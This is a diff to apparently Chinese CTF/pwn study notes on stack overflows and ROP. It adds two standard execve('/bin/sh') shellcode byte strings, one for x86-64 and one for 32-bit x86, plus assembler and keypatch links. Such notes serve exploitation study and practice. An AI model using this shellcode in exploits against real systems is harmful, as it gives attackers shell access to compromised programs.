@@ -77,3 +77,20 @@ http://pwn4.fun/2016/11/09/Return-to-dl-resolve/
 溢出位数不够怎么办：覆盖ebp，Partial Overwrite
 
 现代栈溢出利用技术基础:ROP
+
+## 23字节shellcode
+搜索地址【http://shell-storm.org/online/Online-Assembler-and-Disassembler/】
+```
+char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
+    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
+```
+
+```
+
+"\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+```
+
+## IDA keypatch问题相关
+
+https://github.com/keystone-engine/keypatch/issues/28
